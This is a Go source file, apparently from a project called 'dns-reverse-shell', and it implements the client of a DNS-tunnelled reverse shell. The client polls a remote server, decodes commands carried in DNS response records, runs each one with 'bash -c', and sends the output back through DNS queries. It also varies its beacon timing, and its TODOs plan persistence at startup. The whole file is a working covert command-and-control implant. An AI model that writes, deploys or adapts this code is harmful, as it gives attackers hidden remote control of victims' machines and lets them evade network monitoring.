package protocol

import (
	"dns-reverse-shell/main/encoder"
	"fmt"
	"github.com/miekg/dns"
	"os/exec"
	"time"
)

const sleepIdleTime = 60
const interactiveIdleTime = 5

type messageType string

const (
	POLL   messageType = "poll"
	ANSWER messageType = "answer"
	ERROR  messageType = "error"
)

type DNSClient struct {
	address         string
	encoder         encoder.StringEncoder
	messageSplitter MessageSplitter
	client          *dns.Client
	idleCounter     int
}

func NewDNSClient(address string, encoder encoder.StringEncoder) *DNSClient {
	client := new(dns.Client)
	client.Net = "tcp"
	return &DNSClient{address: address, encoder: encoder, messageSplitter: NewSimpleMessageSplitter(), client: client}
}

func (d DNSClient) Start() {
	for {
		d.poll()
		if d.idleCounter >= 12 {
			time.Sleep(sleepIdleTime * time.Second)
		} else {
			time.Sleep(interactiveIdleTime * time.Second)
		}
	}
}

func (d DNSClient) poll() {
	d.sendMessage(POLL, "poll")
}

func (d DNSClient) sendMessage(commandType messageType, message string) {
	m := d.createMessage(commandType, message)
	in, _, err := d.client.Exchange(m, d.address)
	if err != nil {
		fmt.Println(err)
		d.sendMessage(ERROR, err.Error())
		return
	}
	d.handleAnswer(in)
}

func (d DNSClient) createMessage(commandType messageType, message string) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(string(commandType)), dns.TypeA)
	m.Extra = d.messageSplitter.Split(d.encoder.Encode(message))
	return m
}

func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
	collect := d.messageSplitter.Collect(answerMsg.Extra)
	decoded := d.encoder.Decode(collect)
	fmt.Println(decoded)
	d.handleDecodedCommand(decoded)
}

// todo: add exit and quit command
// todo: add persistent startup command
func (d DNSClient) handleDecodedCommand(decoded string) {
	switch decoded {
	case "idle":
		d.idleCounter++
		break
	case "ok":
		d.idleCounter = 0
		break
	default:
		d.idleCounter = 0
		output := executeCommand(decoded)
		d.sendMessage(ANSWER, output)
	}
}

func executeCommand(command string) string {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return "command execution failed: " + err.Error()
	}
	return string(output)
}
